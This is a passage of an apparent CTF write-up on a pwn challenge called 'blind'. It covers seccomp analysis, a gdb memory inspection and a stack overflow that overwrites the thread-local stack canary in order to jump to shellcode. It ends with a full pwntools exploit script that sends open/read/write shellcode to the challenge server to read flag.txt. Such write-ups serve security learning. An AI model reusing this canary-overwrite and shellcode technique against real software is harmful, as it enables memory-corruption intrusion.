+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Escape</span><span class="o">&gt;</span>  <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+<span class="o">=================================</span>
+ <span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+ <span class="mo">0001</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0a</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
+ <span class="mo">0002</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mo">0003</span><span class="o">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0005</span>
+ <span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x07</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
+ <span class="mo">0005</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">read</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0011</span>
+ <span class="mo">0006</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">write</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0011</span>
+ <span class="mo">0007</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">open</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0011</span>
+ <span class="mo">000</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x00000003</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">close</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0011</span>
+ <span class="mo">000</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x0000003c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">exit</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0011</span>
+ <span class="mo">0010</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x000000e7</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit_group</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
+ <span class="mo">0011</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0012</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+</code></pre></div></div>
+
+<p>only open , read and write are enabled , we cant escape the seccomp in our case so our plan is to <code class="language-plaintext highlighter-rouge">open("./flag.txt")</code> then read from it and write it to <code class="language-plaintext highlighter-rouge">stderr</code> (we are supposing that the server forwards stderr not only stdout which is the case) as <code class="language-plaintext highlighter-rouge">stdin</code> and <code class="language-plaintext highlighter-rouge">stdout</code>
+are closed .</p>
+
+<p>so once we have code execution , we can get our flag .</p>
+
+<h4 id="notes-">Notes :</h4>
+
+<ul>
+  <li>we have thread-stack leak</li>
+  <li>we have read into that buffer with any size we want » overflow</li>
+  <li>stack canary is enabled which adds another layer of complexity</li>
+  <li>NX is disabled which hints for ret2shellcode</li>
+</ul>
+
+<h4 id="first-thoughts">first thoughts</h4>
+
+<ul>
+  <li>we somehow manage to bypass canaries then return to our shellcode but HOW ?</li>
+</ul>
+
+<p>after some thinking , i thought maybe it has something to do with our main thread (it isnt the case , its what i thought ) , so i needed to dive into gdb and see the memory mapping</p>
+
+<h4 id="dive-into-gdb">dive into gdb</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; vmmap
+<span class="o">[</span> Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX <span class="o">]</span>
+Start              End                Size               Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000001000 0x0000000000000000 r-- /home/kali/Desktop/CTFs/0xlaughCTF/pwn/3/blind
+0x0000000000401000 0x0000000000402000 0x0000000000001000 0x0000000000001000 r-x /home/kali/Desktop/CTFs/0xlaughCTF/pwn/3/blind
+0x0000000000402000 0x0000000000403000 0x0000000000001000 0x0000000000002000 r-- /home/kali/Desktop/CTFs/0xlaughCTF/pwn/3/blind
+0x0000000000403000 0x0000000000404000 0x0000000000001000 0x0000000000002000 r-- /home/kali/Desktop/CTFs/0xlaughCTF/pwn/3/blind
+0x0000000000404000 0x0000000000405000 0x0000000000001000 0x0000000000003000 rw- /home/kali/Desktop/CTFs/0xlaughCTF/pwn/3/blind
+0x0000000000405000 0x0000000000426000 0x0000000000021000 0x0000000000000000 rw- <span class="o">[</span>heap]
+
+0x00007ffff758e000 0x00007ffff758f000 0x0000000000001000 0x0000000000000000 <span class="nt">---</span>
+0x00007ffff758f000 0x00007ffff7d8f000 0x0000000000800000 0x0000000000000000 rwx &lt;tls-th2&gt;&lt;stack-th2&gt;  &lt;-  <span class="nv">$rdi</span>, <span class="nv">$r14</span>
+
+0x00007ffff7d8f000 0x00007ffff7d92000 0x0000000000003000 0x0000000000000000 rw- &lt;tls-th1&gt;
+0x00007ffff7d92000 0x00007ffff7dba000 0x0000000000028000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7dba000 0x00007ffff7f1f000 0x0000000000165000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6  &lt;-  <span class="nv">$rcx</span>, <span class="nv">$rip</span>
+0x00007ffff7f1f000 0x00007ffff7f75000 0x0000000000056000 0x000000000018d000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f75000 0x00007ffff7f79000 0x0000000000004000 0x00000000001e2000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f79000 0x00007ffff7f7b000 0x0000000000002000 0x00000000001e6000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f7b000 0x00007ffff7f88000 0x000000000000d000 0x0000000000000000 rw-
+0x00007ffff7f88000 0x00007ffff7f8a000 0x0000000000002000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.5
+0x00007ffff7f8a000 0x00007ffff7f98000 0x000000000000e000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.5
+0x00007ffff7f98000 0x00007ffff7fa6000 0x000000000000e000 0x0000000000010000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.5
+0x00007ffff7fa6000 0x00007ffff7fa7000 0x0000000000001000 0x000000000001e000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.5
+0x00007ffff7fa7000 0x00007ffff7fa8000 0x0000000000001000 0x000000000001f000 rw- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.5
+0x00007ffff7fc0000 0x00007ffff7fc2000 0x0000000000002000 0x0000000000000000 rw-
+0x00007ffff7fc2000 0x00007ffff7fc6000 0x0000000000004000 0x0000000000000000 r-- <span class="o">[</span>vvar]
+0x00007ffff7fc6000 0x00007ffff7fc8000 0x0000000000002000 0x0000000000000000 r-x <span class="o">[</span>vdso]
+0x00007ffff7fc8000 0x00007ffff7fc9000 0x0000000000001000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7fc9000 0x00007ffff7ff0000 0x0000000000027000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ff0000 0x00007ffff7ffb000 0x000000000000b000 0x0000000000028000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000002000 0x0000000000033000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000035000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rwx <span class="o">[</span>stack]  &lt;-  <span class="nv">$rsp</span>, <span class="nv">$r15</span>
+</code></pre></div></div>
+
+<ul>
+  <li>seeing this i discovered that the thread is mmaped memory within the same mapping (the <code class="language-plaintext highlighter-rouge">0x800000</code> chunk) , the thread also inherits the nx flag from the main thread which also makes its stack executable .</li>
+  <li>another thing worht mentionnoning , is the <code class="language-plaintext highlighter-rouge">tls</code> identification that the gef plugin adds , from previous knowledge , i know that the canary is stored inside this <code class="language-plaintext highlighter-rouge">tls</code> section . In fact , the <code class="language-plaintext highlighter-rouge">fs</code> within the <code class="language-plaintext highlighter-rouge">sub    rdx,QWORD PTR fs:0x28</code> is a pointer that points memory within the tls . you can look its value in gdb with ``p $fs_base` .</li>
+  <li>note that <code class="language-plaintext highlighter-rouge">tls</code> stands for <code class="language-plaintext highlighter-rouge">thread local storage</code> , which means every thread has its own <code class="language-plaintext highlighter-rouge">tls</code> , in other words the <code class="language-plaintext highlighter-rouge">fs_base</code> is also distinct for every thread . this also explains the <code class="language-plaintext highlighter-rouge">tls-th1</code> and <code class="language-plaintext highlighter-rouge">tls-th2</code> in <code class="language-plaintext highlighter-rouge">vmmap</code> output .</li>
+  <li>we have infinite overflow (if needed xD) so maybe we can access this <code class="language-plaintext highlighter-rouge">fs section</code> . lets return to gdb and breakpoint when the vuln is reading the canary</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; p <span class="nv">$rsp</span>
+<span class="nv">$5</span> <span class="o">=</span> <span class="o">(</span>void <span class="k">*</span><span class="o">)</span> 0x7ffff7d8de30   <span class="c">#### our input starting adress</span>
+gef&gt; p <span class="nv">$fs_base</span>
+<span class="nv">$6</span> <span class="o">=</span> 0x7ffff7d8e6c0
+gef&gt; p 0x7ffff7d8e6c0-0x7ffff7d8de30
+<span class="nv">$7</span> <span class="o">=</span> 0x890   <span class="c">#### they are very close</span>
+gef&gt; x/gx 0x7ffff7d8e6c0+0x28
+0x7ffff7d8e6e8: 0x0f9195f8cfb01700  <span class="c">### our canary</span>
+</code></pre></div></div>
+
+<p>now the plan is set</p>
+
+<h4 id="plan">Plan</h4>
+
+<ol>
+  <li>we set big input size : <code class="language-plaintext highlighter-rouge">0x1000</code> for example</li>
+  <li>write our payload which looks like this : <code class="language-plaintext highlighter-rouge">shellcode + p64(canary=0) + p64(rbp=JUNK) +p64(ret_adress= &amp;shellcode) + padding_to_fs + p8(0)*0x28 + p64(canary=0)</code></li>
+  <li>theoretically , the above 2 steps are enough , but the <code class="language-plaintext highlighter-rouge">read()</code> function uses the value at fs:0x10 for some example so we cant just overwrite it with 0 , we need to overwrite with its old value . And since the thread memory is all contiguous (in virtual at least xD) , and we have the leak , we can get its old value .</li>
+</ol>
+
+<h4 id="solver-1">solver</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* 0x0000000000401432
+                        b* 0x00000000004014c9
+                        c
+                        x/20gx $rsp
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./blind_patched"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc 9ccd3876682d4ea8fcad09429d5797a5.chal.ctf.ae 443"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">sni</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Buffer: "</span><span class="p">)</span>
+<span class="n">leak</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fs_base</span><span class="o">=</span><span class="n">leak</span><span class="o">-</span><span class="mh">0x20</span><span class="o">+</span><span class="mh">0x8a0</span>
+<span class="n">size</span><span class="o">=-</span><span class="mh">0x20</span><span class="o">+</span><span class="mh">0x8a0</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">code</span><span class="o">=</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">"./flag.txt"</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">code</span><span class="o">+=</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="s">'rax'</span><span class="p">,</span><span class="n">leak</span><span class="o">+</span><span class="mh">0x500</span><span class="p">,</span><span class="mh">0x50</span><span class="p">)</span>
+<span class="n">code</span><span class="o">+=</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">leak</span><span class="o">+</span><span class="mh">0x500</span><span class="p">,</span><span class="mh">0x50</span><span class="p">)</span>
+
+
+<span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">shellcode</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x80</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fs_base</span><span class="p">)</span> <span class="c1">#0
+</span><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000b7a2b0</span><span class="p">)</span> <span class="c1">#8
+</span><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fs_base</span><span class="p">)</span> <span class="c1">#0x10
+</span><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#0x18
+</span><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#0x20
+</span><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#0x28 our canary
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">fs_base</span><span class="o">-</span><span class="n">leak</span><span class="o">+</span><span class="mh">0x30</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">fs_base</span><span class="o">-</span><span class="n">leak</span><span class="o">+</span><span class="mh">0x30</span><span class="p">))</span>
+
+<span class="n">debug</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>good challenges , especially the last one was so creative . kudos to iyed and the other authors .</p>
+
+</article>
+
+            </main><footer>
+    <div class="window-container">
+        <div class="window">
+            <div class="contacts">
+                <p><a href="https://github.com/buddurid">Github</a></p>
+                <p><a href="mailto:bbahae624@gmail.com">Email</a></p>
+                <p><a href="https://x.com/buddurid">Twitter</a></p>
+                <p><a href="https://www.linkedin.com/in/bahae-bahrini/">LinkedIn</a></p>
+                <p><a href="">Discord:#buddurid</a></p>
+                <p><a href="">CTFTime</a></p>
+            </div>
+            <p>©2024    Buddurid</p>
+            <p>Hosted on <a href="https://github.com/buddurid/buddurid.github.io/">GitHub Pages.</a></p>
+        </div>
+    </div>
+    <script src="/assets/footer-fix.js"></script>
+</footer>
+</div>
+    </body>
+</html>
